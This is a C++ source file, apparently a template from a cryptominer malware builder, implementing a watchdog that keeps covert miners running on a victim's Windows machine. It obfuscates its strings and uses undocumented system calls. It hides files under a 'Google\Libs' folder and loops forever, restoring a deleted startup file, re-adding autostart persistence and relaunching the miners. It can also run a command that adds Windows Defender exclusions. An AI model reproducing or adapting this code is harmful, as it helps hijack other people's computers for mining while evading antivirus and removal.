#include "UFiles\ntddk.h"
#include <shlobj.h>

#include "UFiles\utils.h"
#include "UFiles\common.h"
#include "UFiles\obfuscatew.h"
#include "UFiles\kernel32_undoc.h"

int wmain(int argc, wchar_t* argv[])
{
    HANDLE hMutex = CreateMutexW(NULL, TRUE, AYW_OBFUSCATE(L"Global\\#WATCHDOGID"));

    load_kernel32_functions();

    wchar_t startupPath[MAX_PATH] = { 0 };
    SHGetFolderPathW(NULL, $BASEDIR, NULL, 0, startupPath);
    wcscat(startupPath, AYW_OBFUSCATE(L"#STARTUPFILE"));

    wchar_t libPath[MAX_PATH] = { 0 };
    SHGetFolderPathW(NULL, $CPPLIBSROOT, NULL, 0, libPath);
    wcscat(libPath, AYW_OBFUSCATE(L"\\Google\\Libs\\"));

    bool hasGPU = has_gpu(libPath);

    wchar_t* minerSet[][2] = { $WATCHDOGSET };

    ULONG fileSize;
    PVOID minerFile = read_file(startupPath, &fileSize);

    LARGE_INTEGER sleeptime;
    sleeptime.QuadPart = -((15000 + $STARTDELAY) * 10000);

    while (true) {
        UtDelayExecution(FALSE, &sleeptime);

        bool minerMissing = false;
        for (int i = 0; i < $MINERCOUNT; i++) {
            bool typeETH = wcsicmp(AYW_OBFUSCATE(L"eth"), minerSet[i][0]) == 0;
            if (!(typeETH && !hasGPU) && !check_mutex(minerSet[i][1])) {
                minerMissing = true;
            }
        }

        bool fileMissing = UpGetFileAttributesW(startupPath) == INVALID_FILE_ATTRIBUTES;
        if (minerMissing || fileMissing) {
#if DefWDExclusions
            run_program(true, AYW_OBFUSCATE(L"#WDCOMMAND"));
#endif
            run_program(true, AYW_OBFUSCATE(L"#STARTUPADD"), startupPath, startupPath, startupPath);
            if (fileMissing) {
                write_file(startupPath, minerFile, fileSize);
            }
            run_program(true, AYW_OBFUSCATE(L"#STARTUPSTART"), startupPath);
        }
    }

    UtClose(hMutex);
	return 0;
} 